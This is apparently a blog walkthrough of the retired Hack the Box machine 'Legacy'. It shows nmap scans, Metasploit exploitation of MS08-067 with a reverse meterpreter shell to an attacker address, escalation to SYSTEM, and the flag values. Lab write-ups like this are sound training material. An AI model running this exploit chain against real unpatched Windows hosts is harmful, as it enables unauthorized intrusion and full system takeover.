---
title: Legacy, Hack the Box CTF Walkthrough
description: 
tag: CTF
image: /assets/img/posts/2021-01-11-legacy-hack-the-box-walkthrough/legacy.png
layout: post
description: ""
date:   2021-01-10 20:01:21 -0400
last-updated: 2021-01-10 20:01:21 -0400
tag: ctf
author: Tyler Butler
---


Legacy is an easy level retired capture the flag machine from Hack the Box. This writeup will describe the techniques I used to bypass security controls and gain root access to the machine.

## Getting Started   
The first thing i did was conduct a basic <kbd>nmap</kbd> scan to search for the top 200 open ports on the target.  

```bash
──(kali㉿kali)-[~/Documents/htb/legacy]
└─$ nmap --top-ports 200 -Pn 10.10.10.4
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 14:50 EST
Nmap scan report for 10.10.10.4
Host is up (0.023s latency).
Not shown: 197 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.57 seconds
                                                                                                                                                          
```  

The scan shows there are at least 2 open ports with services such as netbios and microsoft-ds running. Next, to get a better understanding of the services and version running, and to scan for basic vulnerabilities, I used the <kbd>nmapAutomator</kbd> script.  The below output only shows the most relevant information.  

```bash
---------------------Starting Nmap Vulns Scan---------------------
                                                                                                          
Running CVE scan on basic ports
                                                                                                          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 15:00 EST
Nmap scan report for 10.10.10.4
Host is up (0.023s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds


Running Vuln scan on basic ports
                                                                                                          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 15:00 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.4
Host is up (0.021s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.12 seconds
```  

The scan shows the target is likely vulnerable to CVE-2008-4250, a serious vulnerability also referred to by its [microsoft bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) identifier, Microsoft Windows Server 2000/2003 - Code Execution (MS08-067). There is a public exploit for this vulnerability on metasploit (exploit/windows/smb/ms08_067_netapi), so next i started up the <kbd>msfconsole</kbd> and configured the necessary options.  

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf6 exploit(windows/smb/ms08_067_netapi) > 
```  

Executing the exploit started a reverse meterpreter session on the target. Using the <kbd>getsystem</kbd> meterpreter command, I upgraded my privilege to SYSTEM. At this point I can start looking for the user and root flags.  

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.4:1028) at 2021-01-11 10:22:35 -0500

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > 
```  

I used the <kbd>search</kbd> meterpreter command and found both flags. 

```bash
meterpreter > search -f *user.txt*
Found 1 result...
    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
meterpreter > cat "c:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644fmeterpreter > 
```  
```bash
meterpreter > search -f *root.txt*
Found 1 result...
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713meterpreter > 
```  
## Conclusion  
Overall this was an easy CTF machine that was vulnerable to a very popular windows exploit.  

